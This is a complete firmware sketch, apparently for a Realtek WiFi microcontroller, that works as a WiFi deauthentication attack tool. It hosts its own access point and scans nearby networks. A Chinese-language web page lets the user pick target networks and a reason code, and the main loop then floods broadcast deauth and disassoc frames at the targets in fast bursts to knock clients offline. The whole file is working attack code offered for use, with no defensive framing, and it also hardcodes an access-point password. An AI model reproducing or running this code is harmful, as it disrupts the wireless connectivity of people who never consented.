#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "星烁的Xiaomi_SU7";
char *pass = "1234567890v";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis;
WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

// 非阻塞攻击调度状态
static uint32_t deauth_last_burst_ms = 0;
static size_t deauth_round_robin_index = 0;
static uint8_t last_deauth_channel = 0;

#define FRAMES_PER_DEAUTH 10          // 每个目标每轮发送的帧对数（deauth + disassoc 各一）
#define DEAUTH_BURST_INTERVAL_MS 10   // 目标轮换间隔（毫秒），越小压制越猛
#define MAX_REQUEST_BYTES 4096        // HTTP 请求体大小上限

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    uint8_t ssid_len = record->SSID.len;
    if (ssid_len >= sizeof(record->SSID.val)) ssid_len = sizeof(record->SSID.val) - 1;
    record->SSID.val[ssid_len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = urlDecode(key_value_pair.substring(0, delimiter_position));
            String value = urlDecode(key_value_pair.substring(delimiter_position + 1));
            post_params.push_back({key, value});
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = urlDecode(key_value_pair.substring(0, delimiter_position));
        String value = urlDecode(key_value_pair.substring(delimiter_position + 1));
        post_params.push_back({key, value});
    }

    return post_params;
}

int hexValue(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

String urlDecode(const String &input) {
  String out;
  out.reserve(input.length());
  for (unsigned int i = 0; i < input.length(); i++) {
    char c = input[i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && i + 2 < input.length()) {
      int hi = hexValue(input[i + 1]);
      int lo = hexValue(input[i + 2]);
      if (hi >= 0 && lo >= 0) {
        out += (char)((hi << 4) | lo);
        i += 2;
      } else {
        out += c;
      }
    } else {
      out += c;
    }
  }
  return out;
}

String htmlEscape(const String &input) {
  String out;
  out.reserve(input.length() + 16);
  for (unsigned int i = 0; i < input.length(); i++) {
    char c = input[i];
    switch (c) {
      case '&':  out += "&amp;";  break;
      case '<':  out += "&lt;";   break;
      case '>':  out += "&gt;";   break;
      case '"':  out += "&quot;"; break;
      case '\'': out += "&#39;";  break;
      default:   out += c;        break;
    }
  }
  return out;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\r\n";
  response += "Location: " + url + "\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>雾的思绪</title>
      <style>
          body {
              font-family: Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              max-width: 800px;
              margin: 0 auto;
              padding: 20px;
              background-color: #f4f4f4;
          } 
          h1, h2 {
              color: #2c3e50;
          }
          table {
              width: 100%;
              border-collapse: collapse;
              margin-bottom: 20px;
          }
          th, td {
              padding: 12px;
              text-align: left;
              border-bottom: 1px solid #ddd;
          }
          th {
              background-color: #3498db;
              color: white;
          }
          tr:nth-child(even) {
              background-color: #f2f2f2;
          }
          form {
              background-color: white;
              padding: 20px;
              border-radius: 5px;
              box-shadow: 0 2px 5px rgba(0,0,0,0.1);
              margin-bottom: 20px;
          }
          input[type="submit"] {
              padding: 10px 20px;
              border: none;
              background-color: #3498db;
              color: white;
              border-radius: 4px;
              cursor: pointer;
              transition: background-color 0.3s;
          }
          input[type="submit"]:hover {
              background-color: #2980b9;
          }
          .select-all-label {
              display: inline-flex;
              align-items: center;
              gap: 8px;
              margin-bottom: 10px;
              font-size: 14px;
              cursor: pointer;
          }
      </style>
      <script>
          function updateSelectAll() {
              var checkboxes = document.querySelectorAll('input[name="network"]');
              var selectAllCheckbox = document.getElementById('selectAllCheckbox');
              var allChecked = true;
              for (var i = 0; i < checkboxes.length; i++) {
                  if (!checkboxes[i].checked) {
                      allChecked = false;
                      break;
                  }
              }
              selectAllCheckbox.checked = allChecked;
          }

          function toggleSelectAll() {
              var checkboxes = document.querySelectorAll('input[name="network"]');
              var selectAllCheckbox = document.getElementById('selectAllCheckbox');
              for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].checked = selectAllCheckbox.checked;
              }
          }

          // 页面加载后绑定事件
          window.onload = function() {
              var checkboxes = document.querySelectorAll('input[name="network"]');
              for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].addEventListener('change', updateSelectAll);
              }
              document.getElementById('selectAllCheckbox').addEventListener('change', toggleSelectAll);
          };
      </script>
  </head>
  <body>
      <h1>雾的思绪</h1>

      <h2>WiFi 列表</h2>
      <form method="post" action="/deauth">
          <label class="select-all-label">
              <input type="checkbox" id="selectAllCheckbox"> 全选/取消全选
          </label>
          <table>
              <tr>
                  <th>选择</th>
                  <th>序号</th>
                  <th>wifi名称</th>
                  <th>BSSID</th>
                  <th>信道</th>
                  <th>信号强度（db）</th>
                  <th>频段</th>
              </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + String(i) + "</td>";
    response += "<td>" + htmlEscape(scan_results[i].ssid) + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }

  response += R"(
        </table>
          <p>请填写错误代码:</p>
          <input type="text" name="reason" placeholder="初识你名 久居我心">
          <input type="submit" value="让每个人都能享受科技的乐趣">
      </form>

      <form method="post" action="/rescan">
          <input type="submit" value="科技的终点是让人感受幸福 抵达美好（扫描）">
      </form>

      <form method="post" action="/stop">
          <input type="submit" value="停止攻击">
      </form>
            <!-- 添加的粗体文字 -->
      <div class="footer-note">
          <strong>“我的每个要求你都向我妥协 你的泪滴像秋天的落叶”</strong><br>
          <strong>“你的每个要求我都向你妥协 我的泪滴像冬天的落雪 「X!NG$HUO NAO」 MADE THIS PLAN”</strong>

      <h2>错误代码</h2>
    <table>
        <tr><th>代码</th><th>含义（通俗解释）</th></tr>
        <tr><td>0</td><td>保留代码 (一般不用，留作特殊标记)</td></tr>
        <tr><td>1</td><td>未指定原因 (就是不知道为啥断开了)</td></tr>
        <tr><td>2</td><td>先前认证已失效 (之前验证过的密码或凭证现在没用了)</td></tr>
        <tr><td>3</td><td>离开独立基本服务集(IBSS)或ESS (设备主动离开了这个网络)</td></tr>
        <tr><td>4</td><td>因不活动解除关联 (太久没上网，被踢了)</td></tr>
        <tr><td>5</td><td>AP无法处理所有关联设备 (路由器忙不过来了)</td></tr>
        <tr><td>6</td><td>从未认证设备收到Class 2帧 (还没认证就乱发数据)</td></tr>
        <tr><td>7</td><td>从未关联设备收到Class 3帧 (还没连上就乱发数据)</td></tr>
        <tr><td>8</td><td>因离开基本服务集(BSS)解除关联 (主动离开这个WiFi)</td></tr>
        <tr><td>9</td><td>设备未通过认证 (密码错误或者被拒绝了)</td></tr>
        <tr><td>10</td><td>电源能力信息不可接受 (设备供电有问题)</td></tr>
        <tr><td>11</td><td>支持的信道信息不可接受 (设备不支持的WiFi频道)</td></tr>
        <tr><td>12</td><td>BSS转换管理解除关联 (路由器让你换个连接点)</td></tr>
        <tr><td>13</td><td>无效信息元素 (数据包里有错误的信息)</td></tr>
        <tr><td>14</td><td>消息完整性校验(MIC)失败 (密码可能被破解或数据被篡改)</td></tr>
        <tr><td>15</td><td>4次握手超时 (连接过程中没响应，超时了)</td></tr>
        <tr><td>16</td><td>组密钥握手超时 (更新加密钥匙时没回应)</td></tr>
        <tr><td>17</td><td>4次握手信息元素不匹配 (协商加密时数据对不上)</td></tr>
        <tr><td>18</td><td>无效的组密码 (广播加密方式不支持)</td></tr>
        <tr><td>19</td><td>无效的成对密码 (个人加密方式不支持)</td></tr>
        <tr><td>20</td><td>无效的AKMP (身份验证方式不支持)</td></tr>
        <tr><td>21</td><td>不支持的RSNE版本 (WiFi安全协议版本太老或太新)</td></tr>
        <tr><td>22</td><td>无效的RSNE能力 (安全配置里的能力值有误)</td></tr>
        <tr><td>23</td><td>IEEE 802.1X认证失败 (企业级WiFi的账户验证没通过)</td></tr>
        <tr><td>24</td><td>因安全策略拒绝密码套件 (路由器设置了更严格的规则，不让用这套加密)</td></tr>
    </table>


      </div>
  </body>
  </html>
  )";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks()) {
    delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  digitalWrite(LED_R, HIGH);
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    bool too_large = false;
    while (client.available()) {
      while (client.available() && request.length() < MAX_REQUEST_BYTES) {
        request += (char)client.read();
      }
      if (request.length() >= MAX_REQUEST_BYTES) { too_large = true; break; }
      delay(1);
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (too_large) {
      handle404(client);
    } else if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      deauth_wifis.clear();
      deauth_round_robin_index = 0;
      client.write(makeRedirect("/").c_str());
      while (scanNetworks()) {
        delay(1000);
      }
    } else if (path == "/stop") {
      deauth_wifis.clear();
      deauth_round_robin_index = 0;
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = param.second.toInt();
          if (idx >= 0 && idx < (int)scan_results.size()) {
            deauth_wifis.push_back(idx);
          }
        } else if (param.first == "reason") {
          deauth_reason = (uint16_t)param.second.toInt();
        }
      }
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }
  
  // 非阻塞攻击调度：每隔 DEAUTH_BURST_INTERVAL_MS 轮换一个目标
  if (!deauth_wifis.empty()) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms >= DEAUTH_BURST_INTERVAL_MS) {
      deauth_last_burst_ms = now;
      if (deauth_round_robin_index >= deauth_wifis.size()) deauth_round_robin_index = 0;
      int target = deauth_wifis[deauth_round_robin_index];
      deauth_round_robin_index++;
      if (target >= 0 && target < (int)scan_results.size()) {
        memcpy(deauth_bssid, scan_results[target].bssid, 6);
        // 仅当信道真正变化时才切信道，把时间都省下来发帧
        if (scan_results[target].channel != last_deauth_channel) {
          wext_set_channel(WLAN0_NAME, scan_results[target].channel);
          last_deauth_channel = scan_results[target].channel;
        }
        digitalWrite(LED_B, HIGH);
        // 去认证 + 解除关联双帧连发，紧凑循环不发 delay，帧率最大化
        for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
          wifi_tx_disassoc_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        }
        digitalWrite(LED_B, LOW);
      }
    }
  }
}
